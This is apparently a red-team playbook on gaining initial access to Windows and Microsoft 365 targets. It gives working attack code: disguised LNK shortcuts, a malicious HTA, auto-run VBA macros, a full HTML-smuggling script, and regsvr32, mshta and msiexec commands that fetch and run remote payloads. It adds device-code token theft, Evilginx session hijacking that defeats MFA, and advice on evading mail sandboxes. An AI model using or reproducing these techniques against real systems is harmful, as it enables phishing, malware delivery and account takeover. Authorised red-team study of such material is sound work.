# Red Team - Initial Access

Observation first: there is no universal delivery. What lands and executes follows from the target's mail filtering (attachment/type stripping, sandbox detonation, link rewriting), the browser and its download protections (SmartScreen, download reputation), and OS hardening (macro policy, MOTW enforcement, ASR rules, application control). Enumerate those first; the payload container and execution primitive fall out of what survives that gauntlet. Microsoft has closed several once-reliable techniques (macro auto-run, ISO-mount MOTW stripping) — treat every technique below as viability-dependent on patch level and policy, not evergreen.

## Table of Contents
- [Delivery Decision Note](#delivery-decision-note)
- [MOTW and SmartScreen Basics](#motw-and-smartscreen-basics)
- [Phishing Pretext and Delivery](#phishing-pretext-and-delivery)
- [Payload Phishing vs Credential Phishing](#payload-phishing-vs-credential-phishing)
- [Container Formats and MOTW (ISO/IMG/VHD)](#container-formats-and-motw-isoimgvhd)
- [LNK Payloads](#lnk-payloads)
- [Container + LNK Chains](#container--lnk-chains)
- [HTA](#hta)
- [Office Macros (Legacy) and Current Blocking](#office-macros-legacy-and-current-blocking)
- [OneNote Delivery](#onenote-delivery)
- [HTML Smuggling](#html-smuggling)
- [LOLBIN Delivery (regsvr32 / mshta / scriptlets)](#lolbin-delivery-regsvr32--mshta--scriptlets)
- [ClickOnce](#clickonce)
- [MSI and MSIX](#msi-and-msix)
- [Device-Code and OAuth Phishing (Cloud)](#device-code-and-oauth-phishing-cloud)
- [Evilginx / Reverse-Proxy MFA Phishing](#evilginx--reverse-proxy-mfa-phishing)

For what runs after the click — shellcode loaders, process injection, AMSI/ETW bypass, staging — see [payloads-and-execution.md](payloads-and-execution.md) and [edr-evasion.md](edr-evasion.md). For the redirectors, categorized domains, and mail authentication that deliver these see [c2-infrastructure.md](c2-infrastructure.md). For post-foothold work see [persistence-and-lateral.md](persistence-and-lateral.md). Cloud token/session abuse after a phish continues in the AD/cloud packs.

---

## Delivery Decision Note
Pick the container and execution primitive from what the target's controls actually permit. Ask, in order:

- **Mail filtering**: does the gateway strip/detonate executables, macros, ISO, or archives? Does it rewrite/detonate links? If attachments are gutted, pivot to a link (HTML smuggling, credential/OAuth phish). If links are detonated, delay-gate or password-gate the payload.
- **Browser / download**: SmartScreen and download-reputation punish unsigned, low-prevalence binaries. A signed installer (MSI/MSIX/ClickOnce) or an in-page smuggled file behaves better than a raw `.exe`.
- **OS hardening**: are internet macros blocked by policy (default since 2022)? Are MOTW-aware containers patched (post-Nov-2022)? Are ASR rules on (they block Office-spawns-child, macro Win32-API, and common LOLBINs)? Is WDAC/AppLocker enforced (kills unsigned scripts/binaries)? Each closed control removes a row below.
- **User + context**: what file types does this user open all day (a recruiter opens resumes/OneNote; finance opens spreadsheets/PDFs)? Match the lure to the role.

Rule of thumb by posture: hardened enterprise (macros blocked, MOTW patched, ASR on) => credential/OAuth phish, HTML smuggling of a signed/benign-looking container, or a link to a device-code flow. Softer environment => container+LNK, OneNote, or (rarely) macro still viable. Confirm, don't assume.

---

## MOTW and SmartScreen Basics
Mark-of-the-Web (MOTW) is the `Zone.Identifier` NTFS alternate data stream Windows stamps on files from the internet zone. Downstream controls key off it: Office blocks internet macros, SmartScreen reputation-checks marked executables, and Protected View triggers.

```powershell
# Inspect / view the MOTW ADS on a downloaded file
Get-Content .\payload.iso -Stream Zone.Identifier
Get-Item .\payload.iso -Stream *            # list all ADS
# ZoneId=3 == internet zone
```

- **SmartScreen** (App Reputation): warns/blocks execution of MOTW-marked binaries that lack established reputation or a trusted code-signing history. Low-prevalence unsigned `.exe`/`.dll`/`.msi` get flagged. EV code signing and prevalence reduce prompts; freshly-signed low-volume binaries still often warn.
- The whole game of many container techniques is to prevent MOTW from *propagating* to the payload the user finally executes, so the macro/SmartScreen gate never fires. Microsoft has narrowed which containers leak MOTW (see below).

---

## Phishing Pretext and Delivery
Pretext is the story that makes opening the payload rational for this recipient. Delivery is the mechanism (attachment vs link) that survives the mail gateway.

- **Pretext**: role-relevant and time-pressured but plausible — HR/benefits, invoice/PO, shared document, IT/security "action required", recruiter/CV, DocuSign/e-sign. Spoof or look-alike the sender domain; align with a real internal process where OSINT supports it.
- **Delivery vectors**: direct attachment; link to attacker-hosted file (often behind a categorized domain + redirector); link to a cloud-share; HTML smuggling in-page; reply-chain hijack (reply into a stolen legitimate thread for maximum trust).
- **Gateway survival**: password-protect archives (defeats some inline AV/detonation, but modern sandboxes try common passwords / passwords in body), gate the payload behind a benign-looking landing page, and delay/geo/UA-gate so automated detonation from the vendor's cloud gets a decoy while the real user gets the payload.
- Mail authentication (SPF/DKIM/DMARC) for the sender is in [c2-infrastructure.md](c2-infrastructure.md#mail-infrastructure-spfdkimdmarc).

---

## Payload Phishing vs Credential Phishing
Two distinct objectives; choose per target and rules of engagement.

- **Payload phishing**: get code execution on the endpoint (implant callback). Higher value (full host access) but must beat mail AV/sandbox, MOTW, SmartScreen, and EDR. Everything in the container/LOLBIN sections targets this.
- **Credential phishing**: harvest usernames/passwords via a fake login page. Lower endpoint risk, no binary to detonate, but yields only creds — and bare creds are usually stopped by MFA. Effective against portals without MFA, or as recon.
- **Session/MFA phishing** (reverse proxy, device-code): the modern answer to MFA — capture the authenticated *session/token*, not just the password. See the cloud sections below. Often the highest-yield, lowest-endpoint-risk path into a cloud-first target.

---

## Container Formats and MOTW (ISO/IMG/VHD)
Container formats were historically used because when Windows auto-mounted an ISO/IMG/VHD, the inner files did not inherit MOTW (ISO isn't NTFS, so no ADS), so the payload inside ran without the macro-block/SmartScreen gate.

**Viability caveat (patch-dependent):** Microsoft addressed MOTW propagation for mounted disk-image containers (ISO/IMG/VHD/VHDX) in the security updates released **November 8, 2022**. On patched systems, mounting these images now propagates MOTW to the contained files, closing the classic "mount ISO to strip MOTW" bypass. Treat ISO/IMG/VHD MOTW-stripping as **unreliable on current, patched Windows**; it may still work against unpatched or older hosts. Verify against the target's patch level before relying on it.

```bash
# Build a payload-carrying ISO on Linux (contains an LNK + hidden payload)
genisoimage -o invoice.iso -J -r ./iso_contents/
# or mkisofs / xorriso equivalents; ./iso_contents/ holds the LNK and hidden DLL/EXE/BAT
```

Container files still help as *delivery* (they bypass some inline attachment inspection and require the archiver to preserve MOTW, which many do not on inner files), but do not assume the mounted payload escapes MOTW on a patched endpoint. Tooling that automates container packing (e.g., PackMyPayload) supports ZIP/7z/ISO/IMG/CAB/VHD — useful for testing which formats a given target still leaks MOTW through.

---

## LNK Payloads
A Windows shortcut (`.lnk`) can execute an arbitrary command line while displaying a benign icon/name; the target argument is not shown in a normal view. Common inside a container so the LNK carries no MOTW after an (unpatched) mount.

```powershell
# Create an LNK that launches a hidden payload sitting next to it in the container
$w = New-Object -ComObject WScript.Shell
$lnk = $w.CreateShortcut("$PWD\Invoice.lnk")
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
$lnk.Arguments  = '/c start /min .\readme.dll & rundll32 .\readme.dll,Start'
$lnk.IconLocation = "C:\Windows\System32\shell32.dll,70"   # document icon
$lnk.WindowStyle = 7                                        # minimized
$lnk.Save()
```

Common LNK launch patterns: `cmd /c`, `powershell -nop -w hidden -enc <b64>`, `rundll32 <payload.dll>,<export>`, or a LOLBIN invoking a co-packaged scriptlet. Keep the visible name/icon consistent with the pretext (e.g., `Invoice.pdf` with a PDF icon).

---

## Container + LNK Chains
The classic chain: deliver an archive/ISO containing a decoy-icon LNK plus a hidden payload (DLL/EXE/script). User mounts/extracts, double-clicks the "document", the LNK runs the hidden payload.

```
invoice.iso
├── Invoice.lnk          (visible; icon = PDF; runs rundll32 readme.dll,Start)
├── readme.dll           (hidden; the actual loader)
└── [autorun/decoy pdf]  (optional: also open a real decoy doc for believability)
```

Viability tracks the container caveat above — on a MOTW-patched host the LNK/payload inherit MOTW when mounted, so downstream gates (SmartScreen on the EXE, script-host warnings) may still fire. Password-protected ZIP is a common alternative container that many archivers *do not* propagate MOTW through on extraction, but this too varies by archiver — test the specific one.

---

## HTA
`.hta` (HTML Application) runs via `mshta.exe` with full trust (VBScript/JScript, WScript objects). Delivered as an attachment or, more often, launched from a link/LOLBIN.

```html
<!-- evil.hta -->
<html><head><script language="VBScript">
  Set s = CreateObject("Wscript.Shell")
  s.Run "powershell -nop -w hidden -enc <base64-payload>", 0, False
  window.close()
</script></head><body></body></html>
```

```cmd
:: Remote launch (also a LOLBIN pattern)
mshta https://cdn.example-content.com/u/evil.hta
```

Caveats: `.hta` from the internet carries MOTW and triggers a warning; `mshta` spawning PowerShell is a heavily-monitored parent/child chain and is covered by common ASR rules and EDR. Aging technique — expect detection on mature endpoints.

---

## Office Macros (Legacy) and Current Blocking
VBA macros in Office docs were the dominant vector for a decade (`Document_Open`/`AutoOpen` auto-runs on enable-content).

**Viability caveat (policy default, time-dependent):** Microsoft blocks VBA macros in Office files that carry MOTW (i.e., from the internet/email) **by default**. Announced Feb 2022, rolled out, briefly rolled back mid-2022, then re-enabled and generally available by late 2022. On current Office (Windows: Access/Excel/PowerPoint/Visio/Word) the user gets a red banner and **cannot enable the macro with a click** — they must go to file Properties and Unblock (remove MOTW) first, a much higher bar. XLM/Excel 4.0 macros are likewise restricted/disabled by default. **Treat internet-delivered macro documents as low-yield against a patched, default-configured target.** They remain viable only where MOTW is absent (delivered inside a container that strips it on an unpatched host, or from a trusted location) or where the org has relaxed the policy.

```vba
' Legacy auto-run stub (blocked by default from the internet on current Office)
Sub AutoOpen()
    Shell "powershell -nop -w hidden -enc <base64-payload>", vbHide
End Sub
Sub Document_Open()
    AutoOpen
End Sub
```

If macros are in scope, prefer a trusted-location or intranet-sourced doc (no MOTW), and note ASR rules ("Block Win32 API calls from Office macro", "Block Office child processes") may still stop execution.

---

## OneNote Delivery
OneNote `.one` files became popular as the macro block took hold: OneNote had no MOTW-macro gate and lets you embed files/objects that run on click. An attacker overlays a fake "Double-click to view" button over an embedded script/LNK/HTA.

```
lure.one
└── embedded object: script.hta / launch.bat / payload.wsf
    (covered by a "Click to view protected document" image the user clicks)
```

**Viability caveat:** Microsoft responded — recent OneNote versions warn on / block launching embedded files with dangerous extensions by default, and admin policies can restrict embedded file types. Detection tooling for `.one` embedded-object extraction is now common. Still useful against un-updated OneNote or relaxed policy; less reliable on current, default builds. Pretext the click as "enable/allow" to work past the added warning.

---

## HTML Smuggling
HTML smuggling delivers the payload as data *inside* an HTML page (JS-constructed Blob) so nothing malicious traverses the network as a file — the "download" is assembled client-side in the browser, dodging inline attachment/proxy inspection. The user still faces MOTW/SmartScreen on the reconstructed file.

```html
<!-- Working blob-download smuggling snippet -->
<html><body>
<script>
  // base64 of the payload bytes (embedded so nothing suspicious is fetched)
  var b64 = "TVqQAAMAAAAEAAAA...";          // e.g. an ISO/ZIP/EXE
  var bin = atob(b64);
  var bytes = new Uint8Array(bin.length);
  for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  var blob = new Blob([bytes], { type: "application/octet-stream" });
  var url  = URL.createObjectURL(blob);
  var a = document.createElement("a");
  a.href = url;
  a.download = "Invoice.iso";               // filename the user sees
  document.body.appendChild(a);
  a.click();                                 // auto-triggers the local "download"
  URL.revokeObjectURL(url);
</script>
</body></html>
```

Notes: the payload never appears as an HTTP response body of the right type, so signature-based proxy/mail scanning of the transfer is bypassed; pair with a container (smuggle an ISO/ZIP) to combine techniques. Modern browsers still apply MOTW and download-reputation to the reconstructed file, and some gateways now detonate/inspect HTML and flag blob-download patterns — so smuggling helps delivery, not post-download execution. Gate the payload behind interaction to evade automated crawlers.

---

## LOLBIN Delivery (regsvr32 / mshta / scriptlets)
Living-off-the-land binaries fetch and execute attacker code using trusted signed Windows binaries, avoiding a dropped `.exe`. Delivered via an LNK/HTA/macro command line or a pasted "fix-it" instruction.

```cmd
:: regsvr32 "squiblydoo" — run a remote scriptlet (COM registration) without dropping a file
regsvr32 /s /n /u /i:https://cdn.example-content.com/u/payload.sct scrobj.dll

:: mshta — run a remote HTA/scriptlet
mshta https://cdn.example-content.com/u/a.hta
mshta vbscript:CreateObject("Wscript.Shell").Run("powershell -nop -w hidden -enc <b64>")(window.close)

:: rundll32 — invoke a DLL export (or JS via legacy handler)
rundll32.exe .\readme.dll,StartW
```

```xml
<!-- payload.sct scriptlet fetched by the regsvr32 command above -->
<?XML version="1.0"?>
<scriptlet><registration progid="x" classid="{00000000-0000-0000-0000-000000000001}">
<script language="JScript"><![CDATA[
  new ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -enc <b64>");
]]></script></registration></scriptlet>
```

These parent/child chains (`regsvr32`/`mshta`/`rundll32` -> network -> `powershell`) are among the most-monitored on Windows and are covered by ASR rules and EDR analytics — use only where you have reason to believe detection is weak, and prefer them as one link in a larger chain rather than the whole delivery.

---

## ClickOnce
ClickOnce is a Microsoft app-deployment tech (`.application` manifest) launched from a browser via `dfsvc.exe`/`dfshim.dll`. It can install and run a .NET app from a URL with a smoother trust prompt than a raw download, and is a signed-Microsoft-process execution path.

```
https://cdn.example-content.com/app/Setup.application
   -> dfsvc.exe processes the deployment manifest
   -> downloads + runs the referenced .NET application
```

Notes: modern browsers no longer natively launch `.application` (legacy IE/ClickOnce browser integration is largely gone), so delivery usually means getting the user to run the ClickOnce launcher/manifest via a link handler or a helper. SmartScreen and publisher-trust prompts still apply; signing improves the prompt. Viability is environment-specific — confirm ClickOnce is enabled and launchable.

---

## MSI and MSIX
Installer packages run via trusted `msiexec.exe`, can carry custom actions (arbitrary code at install), and — when signed — enjoy better SmartScreen/reputation than a bare `.exe`.

```cmd
:: MSI with a malicious custom action, local or remote
msiexec /i https://cdn.example-content.com/pkg/setup.msi /qn
msiexec /i setup.msi /quiet
```

- **MSI**: custom actions (Type 3072 etc.) can execute a DLL/EXE/script during install. Requires the user to run the installer (often elevated). Signing + a believable product name/pretext raises success and lowers SmartScreen friction.
- **MSIX / AppX**: modern packaged-app format, installs via `Add-AppxPackage`. **Must be signed by a certificate trusted on the target** (a real constraint — self-signed needs the cert imported first), which limits opportunistic use but yields clean, signed execution where you can meet the signing bar. `.msix` from the internet still carries MOTW/SmartScreen considerations.

```powershell
Add-AppxPackage -Path .\app.msix         # requires trusted signing cert on the host
```

---

## Device-Code and OAuth Phishing (Cloud)
Against cloud-first (Entra ID / Microsoft 365, Google Workspace) targets, phish the *token*, not the endpoint. Two variants:

- **Device-code phishing**: initiate the OAuth device-authorization flow on your side, send the victim the legitimate provider URL + the short user-code, and prompt them to "sign in to continue". They authenticate (and satisfy MFA) on the *real* provider; you poll the token endpoint and receive their access + refresh tokens. Powerful because the login page is genuinely the provider's.
- **OAuth consent / illicit-application-consent phishing**: send a real provider consent URL for an attacker-registered app requesting scopes (mail.read, files.read, offline_access). The user consents on the genuine provider; the app (you) gets a token with those scopes and a refresh token — no password, and it survives password resets until consent/token is revoked.

```
# Device-code flow (concept)
POST https://login.microsoftonline.com/common/oauth2/v2.0/devicecode
    client_id=<well-known public client id>&scope=<scopes> offline_access
  -> returns user_code + verification_uri (https://microsoft.com/devicelogin) + device_code
# Victim visits verification_uri, enters user_code, authenticates + MFA on the REAL portal.
POST https://login.microsoftonline.com/common/oauth2/v2.0/token
    grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=<...>&client_id=<...>
  -> poll until you receive access_token + refresh_token
```

Caveats (time-dependent): defenders increasingly detect/limit device-code flows (Conditional Access policies can block them, and Microsoft has added protections/warnings). Consent phishing is countered by admin-consent policies and app-governance. Confirm the tenant's CA/consent posture. Token abuse after capture continues in the AD/cloud packs.

---

## Evilginx / Reverse-Proxy MFA Phishing
Adversary-in-the-middle (AiTM) phishing: a reverse proxy sits between the victim and the *real* login page, relaying traffic transparently. The victim sees a genuine-looking login (your look-alike domain), authenticates and completes MFA against the real backend, and the proxy captures the resulting **session cookie/token** — which you replay to access the account, MFA already satisfied.

```
[ victim ] --> https://login.example-content.com  (Evilginx phishlet, look-alike domain)
                        |  transparently proxies to
                        v
             https://login.microsoftonline.com   (real provider: password + MFA happen here)
                        |
             Evilginx captures the authenticated session cookie -> operator replays it
```

- **Tooling**: Evilginx (phishlets define the target site's domains/cookies to capture) and similar AiTM proxies (Modlishka, Muraena). Requires a look-alike domain + valid TLS cert (Let's Encrypt; see [c2-infrastructure.md](c2-infrastructure.md)).
- **Why it beats MFA**: it steals the post-authentication session, so push/OTP/SMS MFA are all satisfied by the real user and irrelevant to replay.
- **Caveats (time-dependent)**: phishing-resistant MFA (FIDO2/WebAuthn passkeys) is *not* proxy-able — the security key binds the assertion to the real origin, so AiTM fails against it. Conditional-access token-binding, and detection of impossible-travel/anomalous session replay also reduce success. Confirm whether the target enforces FIDO2 before planning around AiTM.
